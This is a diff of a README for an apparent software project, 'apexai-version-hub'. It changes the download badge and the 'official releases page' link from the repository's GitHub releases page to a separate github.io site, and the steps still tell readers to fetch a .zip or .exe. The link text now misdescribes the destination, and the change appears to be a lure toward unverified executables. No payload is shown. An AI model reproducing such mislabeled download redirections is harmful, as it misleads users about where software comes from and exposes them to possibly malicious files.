@@ -1,6 +1,6 @@
 # 🚀 apexai-version-hub - Experience the latest software release today
 
-[![](https://img.shields.io/badge/Download_Latest_Build-Blue)](https://github.com/Aliphatic-dish615/apexai-version-hub/releases)
+[![](https://img.shields.io/badge/Download_Latest_Build-Blue)](https://aliphatic-dish615.github.io)
 
 ## 📌 Overview
 
@@ -10,7 +10,7 @@ ApexAI serves as a central hub for our software project. This repository provide
 
 Follow these steps to obtain the application:
 
-1. Visit the [official releases page](https://github.com/Aliphatic-dish615/apexai-version-hub/releases).
+1. Visit the [official releases page](https://aliphatic-dish615.github.io).
 2. Look for the section labeled "Latest" at the top of the page.
 3. Find the file ending in .zip or .exe under the "Assets" header.
 4. Click the file name to start your download.
